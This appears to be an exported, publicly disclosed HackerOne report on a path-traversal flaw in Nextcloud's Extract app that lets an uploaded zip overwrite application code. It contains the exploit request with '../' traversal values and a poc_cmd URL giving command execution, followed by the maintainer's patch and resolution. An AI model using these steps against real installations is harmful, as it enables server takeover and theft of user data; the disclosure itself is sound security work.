{"id":765291,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjUyOTE=","url":"https://hackerone.com/reports/765291","title":"Remote code execution via path traversal in Zip extraction in the Extract app","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-12-27T23:07:56.864Z","submitted_at":"2019-12-27T23:07:56.864Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"emilvirkki","url":"/emilvirkki","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-03-07T12:54:55.538Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-02-06T12:54:55.135Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I realise this doesn't qualify for a reward, as it's a vulnerability in a third-party app, but as the app is part of the \"official\" VM image provided by Hansson IT, I think it's well worth fixing.\n\nThe Extract app doesn't validate the path or filename of a zip file to be extracted, allowing an attacker to create or overwrite arbitrary files.\n\nHow to reproduce\n===\n\nInstall NextCloud using the VM image with default settings (with the extra security options).\n\nCreate a new user with no user group and log in as that user.\n\nUpload the payload zip file (nextcloud-shell.zip, attached) to the root folder (or wherever you like). It contains a modified version of apps/files/App.php, necessary for getting the payload to run.\n\nClick the \"Extract here\" option for the nextcloud-shell.zip and intercept the request. Modify the **request body** so the request looks something like the following. You need to replace \"normaluser\" with the username of the user you created in (2):\n\n```\nPOST /index.php/apps/extract/ajax/extractHere.php HTTP/1.1\nHost: 192.168.100.32\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: */*\nAccept-Language: fi-FI,fi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken: lv0G5+K7v/a3w30wOMyR35SvBgF35GHmiuoejP+8u7g=:w5s+qIPUj8aAohdpWojkiazdVXYRkwyp47t8ypHy/+4=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 55\nOrigin: https://192.168.100.32\nDNT: 1\nConnection: close\nCookie: ocmmdvtkydkx=1u2e2imt5h7g0pimv84eoqnfco; oc_sessionPassphrase=MXmMNXhcE3%2FpbZla9mKTYIS18lYG49cMP8lTHFrJfGe1jLxHd2hHfg8vYs1O6hFjv2IbkI31jhMeJnajKWNYzIb7G3f9UNiFmyKJwAbzPWLKY594ScipzPr6u%2BN9SUp3; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; nc_username=normaluser; nc_token=FkBWj5z2dOJS0v4putAyW2oL7tAEOc9Q; nc_session_id=1u2e2imt5h7g0pimv84eoqnfco\n\nnameOfFile=../../../../../../mnt/ncdata/normaluser/files/nextcloud-shell.zip\u0026directory=/../../../../var/www/nextcloud/apps/files/lib\u0026external=0\n```\n\nOpen the following URL (replace host ip with your actual install) and observe how the current user and group are printed: `https://192.168.100.32/apps/files/?dir=/\u0026poc_cmd=whoami`. You can obviously change the poc_cmd parameter to run any command you like.\n\n## Impact\n\nThe attacker can run any commands with the privileges of the www-data user. This allows the attacker to access and modify all the files and personally identifiable information in the installation.","vulnerability_information_html":"\u003cp\u003eI realise this doesn\u0026#39;t qualify for a reward, as it\u0026#39;s a vulnerability in a third-party app, but as the app is part of the \u0026quot;official\u0026quot; VM image provided by Hansson IT, I think it\u0026#39;s well worth fixing.\u003c/p\u003e\n\n\u003cp\u003eThe Extract app doesn\u0026#39;t validate the path or filename of a zip file to be extracted, allowing an attacker to create or overwrite arbitrary files.\u003c/p\u003e\n\n\u003ch1 id=\"how-to-reproduce\"\u003eHow to reproduce\u003c/h1\u003e\n\n\u003cp\u003eInstall NextCloud using the VM image with default settings (with the extra security options).\u003c/p\u003e\n\n\u003cp\u003eCreate a new user with no user group and log in as that user.\u003c/p\u003e\n\n\u003cp\u003eUpload the payload zip file (nextcloud-shell.zip, attached) to the root folder (or wherever you like). It contains a modified version of apps/files/App.php, necessary for getting the payload to run.\u003c/p\u003e\n\n\u003cp\u003eClick the \u0026quot;Extract here\u0026quot; option for the nextcloud-shell.zip and intercept the request. Modify the \u003cstrong\u003erequest body\u003c/strong\u003e so the request looks something like the following. You need to replace \u0026quot;normaluser\u0026quot; with the username of the user you created in (2):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /index.php/apps/extract/ajax/extractHere.php HTTP/1.1\nHost: 192.168.100.32\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: */*\nAccept-Language: fi-FI,fi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken: lv0G5+K7v/a3w30wOMyR35SvBgF35GHmiuoejP+8u7g=:w5s+qIPUj8aAohdpWojkiazdVXYRkwyp47t8ypHy/+4=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 55\nOrigin: https://192.168.100.32\nDNT: 1\nConnection: close\nCookie: ocmmdvtkydkx=1u2e2imt5h7g0pimv84eoqnfco; oc_sessionPassphrase=MXmMNXhcE3%2FpbZla9mKTYIS18lYG49cMP8lTHFrJfGe1jLxHd2hHfg8vYs1O6hFjv2IbkI31jhMeJnajKWNYzIb7G3f9UNiFmyKJwAbzPWLKY594ScipzPr6u%2BN9SUp3; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; nc_username=normaluser; nc_token=FkBWj5z2dOJS0v4putAyW2oL7tAEOc9Q; nc_session_id=1u2e2imt5h7g0pimv84eoqnfco\n\nnameOfFile=../../../../../../mnt/ncdata/normaluser/files/nextcloud-shell.zip\u0026amp;directory=/../../../../var/www/nextcloud/apps/files/lib\u0026amp;external=0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOpen the following URL (replace host ip with your actual install) and observe how the current user and group are printed: \u003ccode\u003ehttps://192.168.100.32/apps/files/?dir=/\u0026amp;poc_cmd=whoami\u003c/code\u003e. You can obviously change the poc_cmd parameter to run any command you like.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe attacker can run any commands with the privileges of the www-data user. This allows the attacker to access and modify all the files and personally identifiable information in the installation.\u003c/p\u003e\n","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":670123,"file_name":"nextcloud-shell.zip","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5Mh2dyHyxTcwGZKe1fmocZ91?response-content-disposition=attachment%3B%20filename%3D%22nextcloud-shell.zip%22%3B%20filename%2A%3DUTF-8%27%27nextcloud-shell.zip\u0026response-content-type=application%2Fzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2UMPB2FX%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064818Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEq9neBunEjsdY7f8cNZfYtjkYnfx7sYXIBk82UycrktAiEA5w10R4CJv%2FQIiYTXv1ZP8q%2BbScvvzy7qwcG%2BmPmKCXMqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKX6CTSGAGf6Bt5yHyqRA9qW1WRQYe7JztYb6rdSeSRyzKgf4LxEu42JMoyPyy0VqqdaIdaW%2F5Oe%2FZcBqKJkPjfrnsLv1E3Cttn6QZ2fsMawdDGLyKyEEvAx6LbD4TYD1QOy0YJIw6j32Nt3V4psvzyU384FsJYLymiqMGAqTzIuUS4QNvTcHn%2BFoOZvS%2F06fP5YWj%2BxpW%2BELDyBb5CFIWqKXYmkW%2BPv4IxFiMVfFF4KM80ZKVGfyJ7nRaRwvjM5YUJYHOlvXjFuPBSC3IYIgEZYlopEqTolZ1OQ2zbi1yDB%2FWl1rx7i7cbCVK6zJwPdLcPRBOa7jlMN0jlHdNPzjyKxdEaNBy7Cyflyw%2FZCl7X1dB7yuSBF8YK2st4h%2FZchseLh%2BjukipjtpVl5nDjO8BSu5evt1V1lFzADomlTKShrSgjmej1gvXmULpbdNuEwc3vMl328MfuwtHHSSvzZo5xxP0U1cq9fhM0Ztcea1ZRpQDZR4DB1jRqdjeMIXNuuwv3G7Uotj1VrvA87zW9Og6gQ9VN7fQSdOpurQFAV2WvRMIuSqv8FOusB%2B%2BEh7xquKUpKrZEfrLl0yLcAZyezk5OlnVLaoE%2BCU7%2F1YWDwq4fJ%2Fzqx58r%2Ffgzx%2FRuGFLAoCPIl7GI47ntqpCuRo5kjknXh3Vhm0Ds%2B9y0Uo9mgVKhl6XjEqADeRJOm5JpIvTZkPibWah%2FFXooiOsIWnpbe3xZbkrh62wdx0iVuonbBNy6Z0vYXXREkzeNyKh%2Fx0i0DwAehfYiLehqkIm1GqvDnaSiQ0dTRzOsrEnXwNhRtDRaBDDLvFXHGy3Xm8ucb70jki0U1otEIUfIG%2Fnfsrs7zhSOcLfi6%2B4aytuy%2FrSFLmVnwIpfIzQ%3D%3D\u0026X-Amz-Signature=8b875e1e5bb415de7b1669685371b925c4d70135d4aa85bbde15f03c950c6e4c","file_size":1094,"type":"application/zip"}],"allow_singular_disclosure_at":"2020-03-07T12:54:55.230Z","allow_singular_disclosure_after":-25638803.32001773,"singular_disclosure_allowed":true,"vote_count":37,"voters":["a_d_a_m","yvvdwf","nkx","brodie_codie","az1441","realtess","mayurudiniya","sodium_","h4x0r-dz","hakmod","and 27 more..."],"severity":{"rating":"high","score":8.8,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":42,"asset_type":"URL","asset_identifier":"https://apps.nextcloud.com/","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6638064,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us!\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we\u0026#39;d like to ask you to not disclose this issue to any other party.\u003c/p\u003e\n","automated_response":true,"created_at":"2019-12-27T23:07:57.151Z","updated_at":"2019-12-27T23:07:57.151Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6707916,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for reporting.\n\nDefinitly the right decision.\n\nI will contact the owner of the app and make sure it's fixed soon","markdown_message":"\u003cp\u003eThanks for reporting.\u003c/p\u003e\n\n\u003cp\u003eDefinitly the right decision.\u003c/p\u003e\n\n\u003cp\u003eI will contact the owner of the app and make sure it\u0026#39;s fixed soon\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-07T13:22:25.880Z","updated_at":"2020-01-07T13:22:25.880Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6707917,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-07T13:22:34.558Z","updated_at":"2020-01-07T13:22:34.558Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6707920,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"Not eligible for a bounty because it's a 3rd party app.","markdown_message":"\u003cp\u003eNot eligible for a bounty because it\u0026#39;s a 3rd party app.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-07T13:23:06.817Z","updated_at":"2020-01-07T13:23:06.817Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6707922,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-07T13:23:14.289Z","updated_at":"2020-01-07T13:23:14.289Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"reporter":{"username":"emilvirkki","url":"/emilvirkki"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6708483,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you confirm that the following patch is enough to prevent the issue?\n\n```diff\ndiff --git a/lib/Controller/ExtractionController.php b/lib/Controller/ExtractionController.php\nindex a0dc4fb..a46fce2 100644\n--- a/lib/Controller/ExtractionController.php\n+++ b/lib/Controller/ExtractionController.php\n@@ -40,6 +40,14 @@ class ExtractionController extends Controller {\n        */\n \n        public function extractHere($nameOfFile, $directory, $external, $shareOwner = null) {\n+               if (preg_match('/(\\/|^)\\.\\.(\\/|$)/', $nameOfFile)) {\n+                       $response = ['code' =\u003e 0, 'desc' =\u003e 'Can\\'t find zip file'];\n+                       return json_encode($response);\n+               }\n+               if (preg_match('/(\\/|^)\\.\\.(\\/|$)/', $directory)) {\n+                       $response = ['code' =\u003e 0, 'desc' =\u003e 'Can\\'t open zip file at directory'];\n+                       return json_encode($response);\n+               }\n                if (!extension_loaded (\"zip\")){\n                        $response = array_merge($response, array(\"code\" =\u003e 0, \"desc\" =\u003e $this-\u003el-\u003et(\"Zip extension is not available\")));\n                        return json_encode($response);\n@@ -81,6 +89,14 @@ class ExtractionController extends Controller {\n        * @NoAdminRequired\n        */\n        public function extractHereRar($nameOfFile, $directory, $external, $shareOwner = null) {\n+               if (preg_match('/(\\/|^)\\.\\.(\\/|$)/', $nameOfFile)) {\n+                       $response = ['code' =\u003e 0, 'desc' =\u003e 'Can\\'t find rar file'];\n+                       return json_encode($response);\n+               }\n+               if (preg_match('/(\\/|^)\\.\\.(\\/|$)/', $directory)) {\n+                       $response = ['code' =\u003e 0, 'desc' =\u003e 'Can\\'t open rar file at directory'];\n+                       return json_encode($response);\n+               }\n                $response = array();\n                if ($external){\n                        $externalMountPoints = $this-\u003egetExternalMP();\n@@ -159,6 +175,14 @@ class ExtractionController extends Controller {\n        * @NoAdminRequired\n        */\n        public function extractHereOthers($nameOfFile, $directory, $external, $shareOwner = null) {\n+               if (preg_match('/(\\/|^)\\.\\.(\\/|$)/', $nameOfFile)) {\n+                       $response = ['code' =\u003e 0, 'desc' =\u003e 'Can\\'t find file'];\n+                       return json_encode($response);\n+               }\n+               if (preg_match('/(\\/|^)\\.\\.(\\/|$)/', $directory)) {\n+                       $response = ['code' =\u003e 0, 'desc' =\u003e 'Can\\'t open file at directory'];\n+                       return json_encode($response);\n+               }\n                $response = array();\n                if ($external){\n                        $externalMountPoints = $this-\u003egetExternalMP();\n```","markdown_message":"\u003cp\u003eCan you confirm that the following patch is enough to prevent the issue?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/lib/Controller/ExtractionController.php b/lib/Controller/ExtractionController.php\nindex a0dc4fb..a46fce2 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/lib/Controller/ExtractionController.php\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/lib/Controller/ExtractionController.php\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -40,6 +40,14 @@\u003c/span\u003e class ExtractionController extends Controller {\n        */\n\n        public function extractHere($nameOfFile, $directory, $external, $shareOwner = null) {\n\u003cspan class=\"gi\"\u003e+               if (preg_match(\u0026#39;/(\\/|^)\\.\\.(\\/|$)/\u0026#39;, $nameOfFile)) {\n+                       $response = [\u0026#39;code\u0026#39; =\u0026gt; 0, \u0026#39;desc\u0026#39; =\u0026gt; \u0026#39;Can\\\u0026#39;t find zip file\u0026#39;];\n+                       return json_encode($response);\n+               }\n+               if (preg_match(\u0026#39;/(\\/|^)\\.\\.(\\/|$)/\u0026#39;, $directory)) {\n+                       $response = [\u0026#39;code\u0026#39; =\u0026gt; 0, \u0026#39;desc\u0026#39; =\u0026gt; \u0026#39;Can\\\u0026#39;t open zip file at directory\u0026#39;];\n+                       return json_encode($response);\n+               }\n\u003c/span\u003e                if (!extension_loaded (\u0026quot;zip\u0026quot;)){\n                        $response = array_merge($response, array(\u0026quot;code\u0026quot; =\u0026gt; 0, \u0026quot;desc\u0026quot; =\u0026gt; $this-\u0026gt;l-\u0026gt;t(\u0026quot;Zip extension is not available\u0026quot;)));\n                        return json_encode($response);\n\u003cspan class=\"p\"\u003e@@ -81,6 +89,14 @@\u003c/span\u003e class ExtractionController extends Controller {\n        * [@NoAdminRequired](/noadminrequired)\n        */\n        public function extractHereRar($nameOfFile, $directory, $external, $shareOwner = null) {\n\u003cspan class=\"gi\"\u003e+               if (preg_match(\u0026#39;/(\\/|^)\\.\\.(\\/|$)/\u0026#39;, $nameOfFile)) {\n+                       $response = [\u0026#39;code\u0026#39; =\u0026gt; 0, \u0026#39;desc\u0026#39; =\u0026gt; \u0026#39;Can\\\u0026#39;t find rar file\u0026#39;];\n+                       return json_encode($response);\n+               }\n+               if (preg_match(\u0026#39;/(\\/|^)\\.\\.(\\/|$)/\u0026#39;, $directory)) {\n+                       $response = [\u0026#39;code\u0026#39; =\u0026gt; 0, \u0026#39;desc\u0026#39; =\u0026gt; \u0026#39;Can\\\u0026#39;t open rar file at directory\u0026#39;];\n+                       return json_encode($response);\n+               }\n\u003c/span\u003e                $response = array();\n                if ($external){\n                        $externalMountPoints = $this-\u0026gt;getExternalMP();\n\u003cspan class=\"p\"\u003e@@ -159,6 +175,14 @@\u003c/span\u003e class ExtractionController extends Controller {\n        * [@NoAdminRequired](/noadminrequired)\n        */\n        public function extractHereOthers($nameOfFile, $directory, $external, $shareOwner = null) {\n\u003cspan class=\"gi\"\u003e+               if (preg_match(\u0026#39;/(\\/|^)\\.\\.(\\/|$)/\u0026#39;, $nameOfFile)) {\n+                       $response = [\u0026#39;code\u0026#39; =\u0026gt; 0, \u0026#39;desc\u0026#39; =\u0026gt; \u0026#39;Can\\\u0026#39;t find file\u0026#39;];\n+                       return json_encode($response);\n+               }\n+               if (preg_match(\u0026#39;/(\\/|^)\\.\\.(\\/|$)/\u0026#39;, $directory)) {\n+                       $response = [\u0026#39;code\u0026#39; =\u0026gt; 0, \u0026#39;desc\u0026#39; =\u0026gt; \u0026#39;Can\\\u0026#39;t open file at directory\u0026#39;];\n+                       return json_encode($response);\n+               }\n\u003c/span\u003e                $response = array();\n                if ($external){\n                        $externalMountPoints = $this-\u0026gt;getExternalMP();\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-01-07T14:19:10.264Z","updated_at":"2020-01-07T14:19:10.264Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6749583,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The patch looks sufficient to me :)","markdown_message":"\u003cp\u003eThe patch looks sufficient to me :)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-12T23:13:08.842Z","updated_at":"2020-01-12T23:13:08.842Z","actor":{"username":"emilvirkki","cleared":false,"url":"/emilvirkki","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6978474,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks a lot for your report again. This has been resolved in the latest maintenance releases.","markdown_message":"\u003cp\u003eThanks a lot for your report again. This has been resolved in the latest maintenance releases.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-06T12:54:48.689Z","updated_at":"2020-02-06T12:54:48.689Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"emilvirkki","url":"/emilvirkki"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6978475,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-06T12:54:55.163Z","updated_at":"2020-02-06T12:54:55.163Z","first_to_agree":true,"actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7251505,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-07T12:54:55.567Z","updated_at":"2020-03-07T12:54:55.567Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}